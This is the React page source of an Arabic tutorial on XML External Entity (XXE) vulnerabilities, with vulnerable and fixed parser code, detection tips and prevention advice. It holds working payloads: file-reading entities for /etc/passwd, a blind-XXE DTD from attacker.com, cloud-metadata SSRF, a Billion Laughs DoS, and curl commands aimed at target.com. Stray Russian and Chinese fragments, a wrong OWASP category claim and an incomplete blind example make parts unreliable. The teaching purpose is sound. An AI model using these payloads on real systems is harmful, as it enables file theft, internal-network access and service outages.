import Link from 'next/link'
import VideoSection from '@/components/VideoSection'
import ToolsSection from '@/components/ToolsSection'
import ShareButtons from '@/components/ShareButtons'
import LabsSection from '@/components/LabsSection'
import Quiz from '@/components/Quiz'

export default function XxePage() {
  return (
    <div className="max-w-4xl mx-auto prose prose-lg" dir="rtl">
      {/* Hero Section */}
      <section className="mb-12">
        <div className="flex items-center gap-3 mb-4">
          <span className="text-5xl">&#x1F4E6;</span>
          <div>
            <h1 className="text-4xl font-bold text-gray-900 mb-0">كيان XML الخارجي</h1>
            <p className="text-xl text-gray-500 mt-1">XML External Entity (XXE)</p>
          </div>
        </div>
        <div className="bg-danger-50 border border-danger-200 rounded-lg p-4 mb-6">
          <span className="inline-block bg-danger-600 text-white px-3 py-1 rounded-full text-sm font-medium mb-2">
            خطيرة جداً
          </span>
          <p className="text-gray-700 mb-0">
            ثغرة أمنية تسمح للمهاجم بحقن تعريفات XML خارجية في طلب XML، مما قد يؤدي إلى قراءة ملفات الخادم الداخلي، أو تنفيذ أوامر عن بعد، أو حتى التوغل الكامل في النظام. تُصنف ضمن OWASP Top 10 كواحدة من أكثر الثغرات خطورة.
          </p>
        </div>
      </section>

      <div className="mb-6">
        <ShareButtons title="XXE - XML External Entity" url={"https://web-security-guide.vercel.app/vulnerabilities/xxe"} />
      </div>

      {/* Definition Section */}
      <section className="mb-12">
        <h2 className="text-3xl font-bold text-gray-900 border-b pb-4">تعريف ثغرة XXE</h2>
        <p>
          ثغرة كيان XML الخارجي (XML External Entity - XXE) هي ثغرة أمنية تحدث عندما يتم معالجة بيانات XML تحتوي على تعريفات خارجية (External Entity Definitions) من قبل محلل XML (XML Parser) بشكل غير آمن. تسمح هذه الثغرة للمهاجم بحقن تعريفات XML مخصصة تشير إلى موارد خارجية أو داخلية.
        </p>
        <p>
          تعتمد هذه الثغرة على ميزة في لغة XML تسمح بتعريف &quot;كيانات&quot; (Entities) التي تُستخدم لتمثيل البيانات. عندما يسمح المحلل بتعريف كيانات خارجية وقم بتحليلها، يمكن للمهاجم استغلال ذلك لقراءة ملفات الخادم أو إجراء هجمات SSRF.
        </p>
        <p>
          خطورة هذه الثغرة تكمن في:
        </p>
        <ul>
          <li><strong>قراءة ملفات حساسة:</strong> قراءة ملفات مثل <code>/etc/passwd</code> و <code>/etc/shadow</code> و ملفات التكوين</li>
          <li><strong>تنفيذ أوامر عن بعد (RCE):</strong> في بعض الحالات، تنفيذ أوامر نظام عشوائية</li>
          <li><strong>هجوم SSRF:</strong> استخدام الخادم كنقطة انطلاق للوصول إلى موارد داخلية</li>
          <li><strong>الوصول إلى قواعد البيانات:</strong> الوصول إلى قواعد البيانات الداخلية من خلال تصدير البيانات عبر DNS</li>
          <li><strong>استخراج البيانات:</strong> سرقة أي بيانات يتعامل معها التطبيق من ملفات XML</li>
          <li><strong>-denial of service:</strong> استنزاف موارد الخادم عبر هجمات Billion Laughs</li>
        </ul>
      </section>

      {/* Types Section */}
      <section className="mb-12">
        <h2 className="text-3xl font-bold text-gray-900 border-b pb-4">أنواع ثغرة XXE</h2>

        <div className="mb-8">
          <h3 className="text-2xl font-semibold text-gray-800">1. Classic XXE (الكلاسيكي)</h3>
          <p>
            هو النوع الأكثر شيوعاً وأكثرها وضوحاً. يقوم المهاجم بتعريف كيان XML خارجي يشير إلى ملف داخلي على الخادم، ثم يتم عرض محتوى الملف في استجابة الخادم. يحتاج المهاجم أن يرى النتيجة في الاستجابة.
          </p>
          <ul>
            <li>يتم عبر تعريف كيان XML خارجي في الطلب</li>
            <li>يعرض محتوى الملفات في استجابة الخادم مباشرة</li>
            <li>يعتمد على أن يكون للتطبيق واجهة عرض للمخرجات</li>
          </ul>
          <div className="bg-gray-900 text-gray-100 p-6 rounded-lg overflow-x-auto mb-6">
            <pre><code className="font-mono text-sm">{`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
  <name>&xxe;</name>
  <email>user@example.com</email>
</user>

<!-- عند معالجة XML، يتم استبدال &xxe; بمحتوى ملف /etc/passwd -->
<!-- النتيجة: محتوى ملف passwd سيظهر في حقل الاسم -->`}</code></pre>
          </div>
        </div>

        <div className="mb-8">
          <h3 className="text-2xl font-semibold text-gray-800">2. Blind XXE (الأعمى)</h3>
          <p>
            في هذا النوع، لا يتم عرض محتوى الملفات في استجابة الخادم مباشرة. بدلاً من ذلك، يقوم المهاجم بتحويل البيانات إلى خارج الخادم عبر Out-of-Band channel مثل HTTP request أو DNS query.
          </p>
          <ul>
            <li>يتم عبر إرسال البيانات إلى خادم خارجي يتحكم فيه المهاجم</li>
            <li>يعتمد على مراقبة السجلات على الخادم الخارجي</li>
            <li>أكثر صعوبة في الاكتشاف لأنه لا يترك أثراً واضحاً</li>
          </ul>
          <div className="bg-gray-900 text-gray-100 p-6 rounded-lg overflow-x-auto mb-6">
            <pre><code className="font-mono text-sm">{`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<user>
  <name>&send;</name>
</user>

<!-- الملف يُرسل إلى خادم المهاجم عبر DNS أو HTTP -->`}</code></pre>
          </div>
        </div>

        <div className="mb-8">
          <h3 className="text-2xl font-semibold text-gray-800">3. SSRF via XXE (تزوير الطلبات من جانب الخادم)</h3>
          <p>
            يجمع هذا النوع بين ثغرة XXE وثغرة SSRF. يستخدم المهاجم كيان XML خارجي للوصول إلى موارد داخلية في الشبكة، مثل قواعد البيانات أو خدمات الإدارة.
          </p>
          <ul>
            <li>يسمح بالوصول إلى خدمات внутية لا يمكن الوصول إليها من الخارج</li>
            <li>يمكن استخدامه لفحص المنافذ المفتوحة في الشبكة الداخلية</li>
            <li>يسمح بالوصول إلى AWS EC2 Metadata وخدمات السحابة</li>
          </ul>
          <div className="bg-gray-900 text-gray-100 p-6 rounded-lg overflow-x-auto mb-6">
            <pre><code className="font-mono text-sm">{`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<user>
  <name>&xxe;</name>
</user>

<!-- الوصول إلى AWS EC2 Metadata -->
<!-- يمكن استخدامه للوصول إلى أي عنوان داخلي -->`}</code></pre>
          </div>
        </div>
      </section>

      {/* Code Examples Section */}
      <section className="mb-12">
        <h2 className="text-3xl font-bold text-gray-900 border-b pb-4">أمثلة عملية على الأكواد</h2>

        <h3 className="text-2xl font-semibold text-gray-800">مثال 1: معالجة XML (Java)</h3>

        <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8">
          {/* Vulnerable Code */}
          <div>
            <h4 className="text-lg font-semibold text-danger-700 mb-3">كود ضعيف &#x274C;</h4>
            <div className="bg-gray-900 text-gray-100 p-4 rounded-lg overflow-x-auto">
              <pre><code className="font-mono text-sm">{`// Java - كود ضعيف
import javax.xml.parsers.*;
import org.w3c.dom.*;

DocumentBuilderFactory factory = 
    DocumentBuilderFactory.newInstance();
DocumentBuilder builder = 
    factory.newDocumentBuilder();

// لا يوجد تعطيل للكيانات الخارجية
Document doc = builder.parse(
    new InputSource(request.getInputStream())
);

// معالجة XML مع السماح بالكيانات الخارجية
String name = doc.getElementsByTagName("name")
    .item(0).getTextContent();`}</code></pre>
            </div>
            <div className="bg-danger-50 border border-danger-200 rounded-lg p-3 mt-3">
              <p className="text-sm text-danger-700 mb-0">
                <strong>المشكلة:</strong> لا يوجد تعطيل ل处理 الكيانات الخارجية. يمكن للمهاجم حقن كيان XML خارجي لقراءة ملفات الخادم.
              </p>
            </div>
          </div>

          {/* Secure Code */}
          <div>
            <h4 className="text-lg font-semibold text-success-700 mb-3">كود آمن &#x2705;</h4>
            <div className="bg-gray-900 text-gray-100 p-4 rounded-lg overflow-x-auto">
              <pre><code className="font-mono text-sm">{`// Java - كود آمن
import javax.xml.parsers.*;
import javax.xml.XMLConstants;
import org.w3c.dom.*;

DocumentBuilderFactory factory = 
    DocumentBuilderFactory.newInstance();

// تعطيل الكيانات الخارجية
factory.setFeature(
    "http://apache.org/xml/features/" +
    "disallow-doctype-decl", true
);
factory.setFeature(
    "http://xml.org/sax/features/" +
    "external-general-entities", false
);
factory.setFeature(
    "http://xml.org/sax/features/" +
    "external-parameter-entities", false
);

DocumentBuilder builder = 
    factory.newDocumentBuilder();
Document doc = builder.parse(
    new InputSource(request.getInputStream())
);`}</code></pre>
            </div>
            <div className="bg-success-50 border border-success-200 rounded-lg p-3 mt-3">
              <p className="text-sm text-success-700 mb-0">
                <strong>الحل:</strong> تعطيل الكيانات الخارجية وDTD في محلل XML قبل معالجة أي بيانات XML.
              </p>
            </div>
          </div>
        </div>

        <h3 className="text-2xl font-semibold text-gray-800">مثال 2: معالجة XML (Python)</h3>

        <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8">
          {/* Vulnerable Code */}
          <div>
            <h4 className="text-lg font-semibold text-danger-700 mb-3">كود ضعيف &#x274C;</h4>
            <div className="bg-gray-900 text-gray-100 p-4 rounded-lg overflow-x-auto">
              <pre><code className="font-mono text-sm">{`# Python - كود ضعيف
import xml.etree.ElementTree as ET
from flask import Flask, request

app = Flask(__name__)

@app.route('/api/parse-xml', methods=['POST'])
def parse_xml():
    xml_data = request.data
    # لا يوجد تعطيل للكيانات الخارجية
    root = ET.fromstring(xml_data)
    
    name = root.find('name').text
    return f"Hello, {name}"`}</code></pre>
            </div>
            <div className="bg-danger-50 border border-danger-200 rounded-lg p-3 mt-3">
              <p className="text-sm text-danger-700 mb-0">
                <strong>المشكلة:</strong> ElementTree في Python 3 يدعم XML بشكل آمن بشكل افتراضي، لكن المكتبات القديمة أو المكتبات البديلة مثل lxml قد لا تفعل ذلك.
              </p>
            </div>
          </div>

          {/* Secure Code */}
          <div>
            <h4 className="text-lg font-semibold text-success-700 mb-3">كود آمن &#x2705;</h4>
            <div className="bg-gray-900 text-gray-100 p-4 rounded-lg overflow-x-auto">
              <pre><code className="font-mono text-sm">{`# Python - كود آمن
from defusedxml import ElementTree as ET
from flask import Flask, request

app = Flask(__name__)

@app.route('/api/parse-xml', methods=['POST'])
def parse_xml():
    xml_data = request.data
    # defusedxml يمنع هجمات XXE تلقائياً
    root = ET.fromstring(xml_data)
    
    name = root.find('name').text
    return f"Hello, {name}"`}</code></pre>
            </div>
            <div className="bg-success-50 border border-success-200 rounded-lg p-3 mt-3">
              <p className="text-sm text-success-700 mb-0">
                <strong>الحل:</strong> استخدام مكتبة <code>defusedxml</code> بدلاً من ElementTree العادي لمنع جميع هجمات XML بشكل تلقائي.
              </p>
            </div>
          </div>
        </div>

        <h3 className="text-2xl font-semibold text-gray-800">مثال 3: تحليل XML (C# / .NET)</h3>

        <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8">
          <div>
            <h4 className="text-lg font-semibold text-danger-700 mb-3">كود ضعيف &#x274C;</h4>
            <div className="bg-gray-900 text-gray-100 p-4 rounded-lg overflow-x-auto">
              <pre><code className="font-mono text-sm">{`// C# - كود ضعيف
using System.Xml;

XmlDocument doc = new XmlDocument();
// لا يوجد تعطيل للكيانات الخارجية
doc.Load(request.InputStream);

string name = doc.SelectSingleNode(
    "/user/name"
).InnerText;`}</code></pre>
            </div>
          </div>

          <div>
            <h4 className="text-lg font-semibold text-success-700 mb-3">كود آمن &#x2705;</h4>
            <div className="bg-gray-900 text-gray-100 p-4 rounded-lg overflow-x-auto">
              <pre><code className="font-mono text-sm">{`// C# - كود آمن
using System.Xml;

XmlReaderSettings settings = 
    new XmlReaderSettings();
settings.DtdProcessing = DtdProcessing.Prohibit;
settings.XmlResolver = null;

using (XmlReader reader = XmlReader.Create(
    request.InputStream, settings
))
{
    XmlDocument doc = new XmlDocument();
    doc.Load(reader);
    
    string name = doc.SelectSingleNode(
        "/user/name"
    ).InnerText;
}`}</code></pre>
            </div>
          </div>
        </div>

        <h3 className="text-2xl font-semibold text-gray-800">مثال 4: Billion Laughs Attack (DoS)</h3>

        <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8">
          <div>
            <h4 className="text-lg font-semibold text-danger-700 mb-3">XML ضار (DoS) &#x274C;</h4>
            <div className="bg-gray-900 text-gray-100 p-4 rounded-lg overflow-x-auto">
              <pre><code className="font-mono text-sm">{`<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!-- استمرار التوسع الأسي -->
]>
<root>&lol4;</root>

<!-- هذا XML بحجم 1KB يمكن أن يتوسع إلى GBs -->`}</code></pre>
            </div>
            <div className="bg-danger-50 border border-danger-200 rounded-lg p-3 mt-3">
              <p className="text-sm text-danger-700 mb-0">
                <strong>المشكلة:</strong> توسيع أسي للكيانات يستنزف الذاكرة والموارد، مما قد يؤدي لتعطيل الخادم (Denial of Service).
              </p>
            </div>
          </div>

          <div>
            <h4 className="text-lg font-semibold text-success-700 mb-3">الحماية &#x2705;</h4>
            <div className="bg-gray-900 text-gray-100 p-4 rounded-lg overflow-x-auto">
              <pre><code className="font-mono text-sm">{`<!-- الحل: تعطيل DTD بالكامل -->
<?xml version="1.0" encoding="UTF-8"?>
<!-- لا يوجد تعريف DOCTYPE -->

<user>
  <name>أحمد</name>
  <email>ahmed@example.com</email>
</user>

<!-- أو استخدام Local DTD فقط مع حدود صارمة -->

<!-- في Java: -->
<!-- factory.setFeature(
  "http://apache.org/xml/features/" +
  "disallow-doctype-decl", true
); -->

<!-- في Python: -->
<!-- defusedxml.ElementTree.fromstring() -->`}</code></pre>
            </div>
          </div>
        </div>
      </section>

      {/* Detection Section */}
      <section className="mb-12">
        <h2 className="text-3xl font-bold text-gray-900 border-b pb-4">كيف تكتشف ثغرة XXE</h2>

        <h3 className="text-2xl font-semibold text-gray-800">علامات وجود الثغرة</h3>
        <ul>
          <li>التطبيقات التي تقبل XML كمدخل من المستخدم</li>
          <li>خدمات APIs التي تستخدم Content-Type: application/xml</li>
          <li>تطبيقات SOAP أو SAML</li>
          <li>أنظمة رفع الملفات التي تقبل ملفات XML</li>
          <li>تطبيقات تحليل Office Documents (DOCX, XLSX)</li>
          <li>أنظمة تكامل الأنظمة (Integration Platforms)</li>
        </ul>

        <h3 className="text-2xl font-semibold text-gray-800">أدوات الاكتشاف</h3>
        <ul>
          <li><strong>Burp Suite:</strong> منصة شاملة مع إضافات XXE Scanner</li>
          <li><strong>OWASP ZAP:</strong> أداة مجانية مع دعم اكتشاف XXE</li>
          <li><strong>XMLBomb:</strong> أداة اختبار هجمات Billion Laughs</li>
          <li><strong>xxe-ssrf-daemon:</strong> أداة لإثبات مفهوم هجمات XXE مع SSRF</li>
          <li><strong>WS-Attacker:</strong> أداة اختبار أمان خدمات SOAP</li>
        </ul>

        <div className="bg-gray-900 text-gray-100 p-6 rounded-lg overflow-x-auto mb-6">
          <pre><code className="font-mono text-sm">{`# اختبار XXE باستخدام curl
# اختبار قراءة ملف
curl -X POST http://target.com/api/parse-xml \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
  <name>&xxe;</name>
</user>'

# اختبار Blind XXE مع Out-of-Band
curl -X POST http://target.com/api/parse-xml \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://attacker.com/xxe-probe">
]>
<user>
  <name>&xxe;</name>
</user>'

# اختبار SSRF via XXE
curl -X POST http://target.com/api/parse-xml \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<user>
  <name>&xxe;</name>
</user>'`}</code></pre>
        </div>

        <h3 className="text-2xl font-semibold text-gray-800">نقاط اختبار شائعة</h3>
        <div className="bg-gray-50 border border-gray-200 rounded-lg p-4 mb-6">
          <ul className="mb-0">
            <li><code>file:///etc/passwd</code> - قراءة ملفات الخادم</li>
            <li><code>file:///etc/hostname</code> - قراءة اسم المضيف</li>
            <li><code>http://169.254.169.254</code> - AWS EC2 Metadata</li>
            <li><code>http://metadata.google.internal</code> - Google Cloud Metadata</li>
            <li><code>http://127.0.0.1:3306</code> - فحص MySQL المحلي</li>
            <li><code>http://10.0.0.1</code> - الشبكة الداخلية</li>
          </ul>
        </div>
      </section>

      {/* Prevention Section */}
      <section className="mb-12">
        <h2 className="text-3xl font-bold text-gray-900 border-b pb-4">كيف تمنع ثغرة XXE</h2>

        <h3 className="text-2xl font-semibold text-gray-800">1. تعطيل DTD بالكامل (الأفضل)</h3>
        <p>
          الطريقة الأكثر فعالية هي تعطيل معالجة DTD (Document Type Definition) بالكامل في محلل XML.
        </p>
        <div className="bg-gray-900 text-gray-100 p-6 rounded-lg overflow-x-auto mb-6">
          <pre><code className="font-mono text-sm">{`# Python - تعطيل DTD باستخدام defusedxml
from defusedxml.lxml import fromstring
from lxml import etree

# هذا يمنع جميع أنواع XXE بشكل تلقائي
xml_data = b'<?xml version="1.0"?><user><name>test</name></user>'
tree = etree.ElementTree(fromstring(xml_data))

# في lxml العادي (غير آمن)
# tree = etree.fromstring(xml_data)  # ضعيف!

# Java - تعطيل DTD
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
factory.setFeature(
    "http://apache.org/xml/features/disallow-doctype-decl", true
);

# C# - تعطيل DTD
XmlReaderSettings settings = new XmlReaderSettings();
settings.DtdProcessing = DtdProcessing.Prohibit;
settings.XmlResolver = null;

# PHP - تعطيل الكيانات
libxml_disable_entity_loader(true);`}</code></pre>
        </div>

        <h3 className="text-2xl font-semibold text-gray-800">2. استخدام Safe XML Parsers</h3>
        <p>
          استخدم مكتبات XML آمنة вместه المكتبات المدمجة في اللغة البرمجية.
        </p>
        <div className="bg-gray-900 text-gray-100 p-6 rounded-lg overflow-x-auto mb-6">
          <pre><code className="font-mono text-sm">{`# Python - استخدام defusedxml
# pip install defusedxml
from defusedxml import ElementTree
from defusedxml.cElementTree import fromstring

# بدلاً من:
# import xml.etree.ElementTree as ET  # خطر!

# Java - استخدام XMLInputFactory
XMLInputFactory factory = XMLInputFactory.newInstance();
factory.setProperty(
    XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false
);
factory.setProperty(
    XMLInputFactory.SUPPORT_DTD, false
);

// Node.js - استخدام xml2js
const xml2js = require('xml2js');
const parser = new xml2js.Parser({
    explicitRoot: false,
    explicitArray: false,
    // تعطيل الكيانات
    xmlns: false,
    // عدم تحميل DTD خارجي
    doctype: null
});`}</code></pre>
        </div>

        <h3 className="text-2xl font-semibold text-gray-800">3. تقييد الكيانات الخارجية فقط</h3>
        <p>
          إذا كنت تحتاج إلى استخدام DTD، قم بتعطيل الكيانات الخارجية فقط مع السماح بالكيانات المحلية.
        </p>
        <div className="bg-gray-900 text-gray-100 p-6 rounded-lg overflow-x-auto mb-6">
          <pre><code className="font-mono text-sm">{`# Java - تعطيل الكيانات الخارجية فقط
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();

// تعطيل الكيانات الخارجية
factory.setFeature(
    "http://xml.org/sax/features/external-general-entities", false
);
factory.setFeature(
    "http://xml.org/sax/features/external-parameter-entities", false
);

// تعطيل تحميل DTD خارجي
factory.setFeature(
    "http://apache.org/xml/features/nonvalidating/load-external-dtd", false
);`}</code></pre>
        </div>

        <h3 className="text-2xl font-semibold text-gray-800">4. استخدام JSON بدلاً من XML</h3>
        <p>
          إذا كان ذلك ممكناً، استخدم JSON بدلاً من XML لتجنب ثغرات XXE بالكامل. JSON لا يدعم تعريفات الكيانات_external.
        </p>
        <div className="bg-gray-900 text-gray-100 p-6 rounded-lg overflow-x-auto mb-6">
          <pre><code className="font-mono text-sm">{`// بدلاً من استقبال XML
// استقبال JSON (أكثر أماناً)

// Node.js Express
app.use(express.json());

app.post('/api/user', (req, res) => {
    const { name, email } = req.body;
    // JSON لا يدعم External Entities
    // لا يوجد خطر XXE
    res.json({ message: \`Hello, \${name}\` });
});`}</code></pre>
        </div>

        <h3 className="text-2xl font-semibold text-gray-800">5. مراجعة وتقييم المكتبات</h3>
        <ul>
          <li>راجع جميع المكتبات المستخدمة لمعالجة XML</li>
          <li>تحقق من إعدادات الأمان الافتراضية لكل مكتبة</li>
          <li>حدّث المكتبات بانتظام لاستخدام أحدث الإصلاحات الأمنية</li>
          <li>استخدم Dependency Check Tools لاكتشاف المكتبات المعرضة للثغرات</li>
        </ul>

        <h3 className="text-2xl font-semibold text-gray-800">6. استخدام WAF (جدار حماية تطبيقات الويب)</h3>
        <ul>
          <li>اكتب قواعد WAF لحظر أنماط XML الضارة</li>
          <li>احظرDTD و External Entities في الطلبات</li>
          <li>راقب الطلبات غير الطبيعية التي تحتوي على XML</li>
        </ul>
      </section>

      {/* Security Tips Section */}
      <section className="mb-12">
        <h2 className="text-3xl font-bold text-gray-900 border-b pb-4">نصائح أمنية مهمة</h2>

        <div className="bg-success-50 border border-success-200 rounded-lg p-6 mb-6">
          <div className="flex items-start gap-3">
            <span className="text-2xl">&#x2705;</span>
            <div>
              <h4 className="font-bold text-success-800 mb-2">القاعدة الذهبية</h4>
              <p className="mb-0 text-success-700">
                تعطيل DTD والكيانات الخارجية بالكامل هو الحل الأمثل. إذا كنت لا تحتاج إلى هذه الميزة، لا تسمح بها أبداً. لا تثق بمحلل XML الافتراضي في أي لغة برمجة.
              </p>
            </div>
          </div>
        </div>

        <ul>
          <li><strong>استخدم Safe Parsers دائماً:</strong> مكتبات مثل <code>defusedxml</code> في Python آمنة بشكل افتراضي</li>
          <li><strong>عدم ثقة المدخلات:</strong> لا تثق بأي بيانات XML تأتي من مستخدم أو نظام خارجي</li>
          <li><strong>الحد الأدنى من الصلاحيات:</strong> شغّل التطبيق بصلاحيات أقل مما يمكنه الوصول إليه</li>
          <li><strong>استخدم JSON:</strong> إذا أمكن، استخدم JSON بدلاً من XML لتجنب هذه الثغرة بالكامل</li>
          <li><strong>حدّث المكتبات:</strong> تأكد من استخدام أحدث إصدار من مكتبة XML المستخدمة</li>
          <li><strong>راجع الكود بشكل دوري:</strong> افحص أي كود يعالج XML بشكل دوري</li>
          <li><strong>سجّل الأخطاء:</strong> راقب سجلات الأخطاء لاكتشاف محاولات XXE</li>
          <li><strong>استخدم DTD محلية فقط:</strong> إذا كنت تحتاج إلى DTD، استخدم DTD محلية فقط مع تعطيل الكيانات الخارجية</li>
          <li><strong>قيّد حجم XML:</strong> حدد حجم أقصى لبيانات XML لمنع هجمات Billion Laughs</li>
        </ul>
      </section>

      {/* Common Mistakes Section */}
      <section className="mb-12">
        <h2 className="text-3xl font-bold text-gray-900 border-b pb-4">الأخطاء الشائعة التي يجب تجنبها</h2>

        <div className="space-y-4">
          <div className="bg-danger-50 border border-danger-200 rounded-lg p-4">
            <h4 className="font-bold text-danger-800 mb-2">&#x274C; استخدام محلل XML الافتراضي بدون تعطيل DTD</h4>
            <p className="text-danger-700 mb-0">
              معظم محللات XML تدعم الكيانات الخارجية بشكل افتراضي. يجب تعطيلها يدوياً في كل مرة تستخدم فيها محلل XML.
            </p>
          </div>

          <div className="bg-danger-50 border border-danger-200 rounded-lg p-4">
            <h4 className="font-bold text-danger-800 mb-2">&#x274C; الاعتماد على Deny List لمنع XXE</h4>
            <p className="text-danger-700 mb-0">
              محاولة حظر أنماط XML الضارة فاشلة دائماً لأن المهاجمين يجدون طرقاً للتحايل. الحل هو تعطيل DTD بالكامل وليس حظر الأنماط.
            </p>
          </div>

          <div className="bg-danger-50 border border-danger-200 rounded-lg p-4">
            <h4 className="font-bold text-danger-800 mb-2">&#x274C; استخدام XML مع المدخلات من المستخدم</h4>
            <p className="text-danger-700 mb-0">
              السماح للمستخدم بإدخال بيانات XML بدون تقييد هو السبب الرئيسي لثغرات XXE. يُفضل استخدام JSON بدلاً من XML.
            </p>
          </div>

          <div className="bg-danger-50 border border-danger-200 rounded-lg p-4">
            <h4 className="font-bold text-danger-800 mb-2">&#x274C; عدم استخدام مكتبات XML الآمنة</h4>
            <p className="text-danger-700 mb-0">
              استخدام ElementTree أو lxml بدون إعدادات أمان يعرض تطبيقك لثغرات XXE. استخدم <code>defusedxml</code> بدلاً من ذلك.
            </p>
          </div>

          <div className="bg-danger-50 border border-danger-200 rounded-lg p-4">
            <h4 className="font-bold text-danger-800 mb-2">&#x274C; عدم تحديد حد لحجم XML</h4>
            <p className="text-danger-700 mb-0">
              عدم تحديد حجم أقصى لبيانات XML يسمح لهجمات Billion Laughs باستنزاف موارد الخادم والتعطيل.
            </p>
          </div>

          <div className="bg-danger-50 border border-danger-200 rounded-lg p-4">
            <h4 className="font-bold text-danger-800 mb-2">&#x274C; عدم فحص ملفات XML المرفوعة</h4>
            <p className="text-danger-700 mb-0">
              السماح برفع ملفات XML أو Office Documents (DOCX, XLSX) بدون فحص يعرض النظام لثغرات XXE عبر الملفات المرفوعة.
            </p>
          </div>
        </div>
      </section>

      {/* Severity Impact */}
      <section className="mb-12">
        <h2 className="text-3xl font-bold text-gray-900 border-b pb-4">تأثير الثغرة ومدى خطورتها</h2>

        <div className="grid grid-cols-1 md:grid-cols-3 gap-6 mb-8">
          <div className="bg-danger-50 border border-danger-200 rounded-lg p-6 text-center">
            <div className="text-4xl mb-3">&#x1F534;</div>
            <h4 className="font-bold text-danger-800 mb-2">التأثير على السرية</h4>
            <p className="text-danger-700 mb-0">مرتفع جداً - قراءة ملفات الخادم وسرقة البيانات الحساسة</p>
          </div>
          <div className="bg-danger-50 border border-danger-200 rounded-lg p-6 text-center">
            <div className="text-4xl mb-3">&#x1F534;</div>
            <h4 className="font-bold text-danger-800 mb-2">التأثير على النزاهة</h4>
            <p className="text-danger-700 mb-0">مرتفع - تعديل البيانات أو تنفيذ أوامر عن بعد</p>
          </div>
          <div className="bg-danger-50 border border-danger-200 rounded-lg p-6 text-center">
            <div className="text-4xl mb-3">&#x1F7E0;</div>
            <h4 className="font-bold text-danger-800 mb-2">التأثير على التوفر</h4>
            <p className="text-danger-700 mb-0">متوسط إلى مرتفع - تعطيل الخادم عبر هجمات Billion Laughs</p>
          </div>
        </div>

        <blockquote className="border-r-4 border-danger-500 pr-4 italic text-gray-600 my-6">
          وفقاً لـ OWASP Top 10 (2017)، كانت XXE ضمن فئة A4: Broken Access Control. في عام 2019، اكتشف باحثون ثغرة XXE في Apple iOS تسمح بسرقة الملفات عبر تطبيقات معينة. تأثرت أنظمة كبرى مثل WordPress, Joomla, و Rails بثغرات XXE تاريخياً.
        </blockquote>
      </section>

      <section className="mb-12">
        <LabsSection slug="xxe" />
      </section>

      <section className="mb-12">
        <ToolsSection slug="xxe" />
      </section>

      <Quiz slug="xxe" />
      <VideoSection slug="xxe" />

      {/* Navigation Section */}
      <section className="mt-16">
        <h2 className="text-3xl font-bold text-gray-900 border-b pb-4">أنواع أخرى من الثغرات</h2>
        <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
          <Link
            href="/vulnerabilities/ssrf"
            className="block bg-white border border-gray-200 rounded-lg p-4 hover:shadow-lg transition-all hover:border-primary-300"
          >
            <span className="text-2xl block mb-2">&#x1F5A5;&#xFE0F;</span>
            <h4 className="font-bold text-gray-900 mb-1">SSRF</h4>
            <p className="text-sm text-gray-600 mb-0">تزوير الطلبات من جانب الخادم</p>
          </Link>
          <Link
            href="/vulnerabilities/lfi"
            className="block bg-white border border-gray-200 rounded-lg p-4 hover:shadow-lg transition-all hover:border-primary-300"
          >
            <span className="text-2xl block mb-2">&#x1F4C1;</span>
            <h4 className="font-bold text-gray-900 mb-1">LFI</h4>
            <p className="text-sm text-gray-600 mb-0">تضمين ملفات محلي</p>
          </Link>
          <Link
            href="/vulnerabilities/sql-injection"
            className="block bg-white border border-gray-200 rounded-lg p-4 hover:shadow-lg transition-all hover:border-primary-300"
          >
            <span className="text-2xl block mb-2">&#x1F489;</span>
            <h4 className="font-bold text-gray-900 mb-1">SQL Injection</h4>
            <p className="text-sm text-gray-600 mb-0">حقن SQL</p>
          </Link>
        </div>
        <div className="text-center mt-6">
          <Link
            href="/"
            className="inline-block bg-primary-600 text-white px-6 py-3 rounded-lg font-semibold hover:bg-primary-700 transition-colors"
          >
            العودة للرئيسية
          </Link>
        </div>
      </section>
    </div>
  )
}